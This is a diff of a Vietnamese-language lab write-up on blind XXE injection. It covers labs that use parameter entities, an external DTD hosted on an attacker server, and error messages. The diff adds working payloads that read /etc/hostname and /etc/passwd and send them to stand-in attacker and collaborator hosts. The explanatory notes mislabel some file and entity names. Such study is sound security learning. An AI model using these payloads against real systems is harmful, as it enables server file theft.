@@ -100,9 +100,8 @@ To solve the lab, use a parameter entity to make the XML parser issue a DNS look
 - Thông báo Entities này không được phép sử dụng, chúng ta sẽ bypass bằng cách sử dụng `parameter entities`.
 Payload
 ```XML
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY % vul SYSTEM "http://4kpiymbe71yksume6vrf58pdx43vrlfa.oastify.com">]>
-<stockCheck><productId>% vul</productId><storeId>1</storeId></stockCheck>
+<!DOCTYPE name [<!ENTITY % abc SYSTEM "http://jaxx7bdprmz48fnsc4q1si1ho8uziq6f.oastify.com">%abc;]>
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
 ```
 ![alt text](image-8.png)
 ![alt text](image-9.png)
@@ -127,5 +126,99 @@ Tại sao lại hiện `"XML parsing error"` ???
 
 ### 5. Exploiting blind XXE to exfiltrate data using a malicious external DTD
 **Yêu cầu**
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+To solve the lab, exfiltrate the contents of the `/etc/hostname` file. 
+
 **Thực hiện**
+- Cũng như bài lab #4, trước tiên ta xác định lỗ hổng SSRF bằng OOB.
+Payload
+```XML
+<!DOCTYPE name [<!ENTITY % abc SYSTEM "http://jaxx7bdprmz48fnsc4q1si1ho8uziq6f.oastify.com">%abc;]>
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+![alt text](image-11.png)
+
+- Như vậy là xác nhận được lỗ hổng bước tiếp theo là tìm cách để trích xuất data.
+- Kịch bản ở đây sẽ là chúng ta sẽ tạo 1 tệp `.dtd` được lưu ở server (attacker). Khi ứng dụng mục tiêu xử lý XML có lỗi XXE (XML External Entity Injection), nó sẽ tải file `.dtd` từ server của kẻ tấn công, và thực thi các entity được khai báo bên trong để trích xuất dữ liệu nhạy cảm từ hệ thống.
+- Xây dựng file `dtd` và để chúng trên `exploit server`.
+```XML
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; leak SYSTEM 'http://attacker-server?leak=%file;'>">
+%eval;
+%leak;
+```
+![alt text](image-12.png)
+
+- Thực hiện chèn XML ở chức năng checkStock. Mục tiêu là `fetch` tới `.dtd` được đặt tại host của `attacker`.
+![alt text](image-13.png)
+
+- Gửi đi và quan sát ở Burp Colaborator
+![alt text](image-14.png)
+
+- Hoàn thành lab
+
 **Note**
+Có 2 dạng DTD thường được sử dụng:
+- **Internal DTD**: Khai báo trực tiếp trong file XML, giúp định nghĩa cấu trúc và quy tắc của tài liệu XML ngay trong chính file đó. 
+- **External DTD**: Khai báo trong một file `.dtd` riêng biệt và được tham chiếu từ file XML. Trong tấn công XXE injection, kẻ tấn công thường sử dụng External DTD để truy xuất dữ liệu nhạy cảm từ hệ thống mục tiêu và gửi đến server do chúng kiểm soát.
+
+```XML
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
+```
+Cách hoạt động của file DTD:
+- Định nghĩa một parameter entity %file chứa nội dung file /etc/passwd.
+- Định nghĩa một entity %eval, trong đó khai báo entity %exfiltrate để gửi request HTTP đến attacker kèm nội dung %file.
+- Gọi entity %eval để thực thi khai báo entity %exfiltrate.
+- Gọi entity %exfiltrate để gửi dữ liệu về attacker.
+
+Một số lưu ý:
+- &#x25; là mã HTML encode của ký tự % giúp tránh lỗi cú pháp.
+- Các parameter entity phải được gọi thì mới có tác dụng.
+- Kẻ tấn công có thể triển khai file DTD trên server public và tham chiếu trong payload XML.
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe;]>
+```
+
+Khi server xử lý payload trên, nó tải file DTD từ attacker và thực hiện các lệnh khai báo, dẫn đến việc gửi nội dung file nhạy cảm về server attacker.
+
+Lưu ý: Kỹ thuật này có thể không hoạt động nếu dữ liệu có chứa ký tự đặc biệt như dấu xuống dòng. Một giải pháp thay thế là sử dụng giao thức FTP thay vì HTTP để gửi dữ liệu ra ngoài.
+
+## Exploiting blind XXE to retrieve data via error messages
+
+## 6.Exploiting blind XXE to retrieve data via error messages
+**Yêu cầu**
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.
+The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.
+
+**Thực hiện**
+- Sử dụng burp colaborator để kiểm tra lỗ hổng
+![alt text](image-15.png)
+![alt text](image-16.png)
+
+- Tuy là thông báo lỗi nhưng bên Burp colaborator vẫn nhận được thông báo. Khi không có protocol, sau quá trình phân tích cú pháp XML, hệ thống đã ghép và truy cập tới `/home/peter/ftcx9mtq7g7r02xx8ihek1slscy3mtai.oastify.com`. Do không tìm thấy đường dẫn như trong ảnh nên trả về lỗi `java.io.FileNotFoundException`.
+- Vậy thì ý tưởng của bài này sẽ là thay thế chuỗi `burp-colaborator.domain` bằng nội dung file cần đọc, và kích hoạt lỗi phân tích cú pháp, từ đó nội dung file sẽ được trang web hiển thị cùng với error message.
+- Payload:
+```XML
+<!DOCTYPE foo [ <!ENTITY % xee SYSTEM "https://exploit-0acd004103df9276878b60eb01f7001c.exploit-server.net/exploit.dtd"> %xee; ]>
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+- file `.dtd`
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % xxe "<!ENTITY &#x25; show SYSTEM 'abc/%file;'>">
+%xxe;
+%show;
+
+```
+
+- Thực hiện khai thác
+![alt text](image-17.png)
+
+**Note**
+Trong một số trường hợp khi chúng ta sử dụng sai cú pháp XML dẫn đến quá trình phân tích cú pháp dữ liệu gặp lỗi, lúc này hệ thống thường trả về các đoạn thông báo lỗi (error message), chúng có thể chứa một số thông tin nhạy cảm.
+Bằng cách đưa luồng xử lý hệ thống đi vào trường hợp error, chúng ta có thể kết hợp sử dụng external DTD nhằm "gửi" nội dung file bất kỳ vào các đoạn thông báo lỗi, từ đó hiển thị chúng trong giao diện.
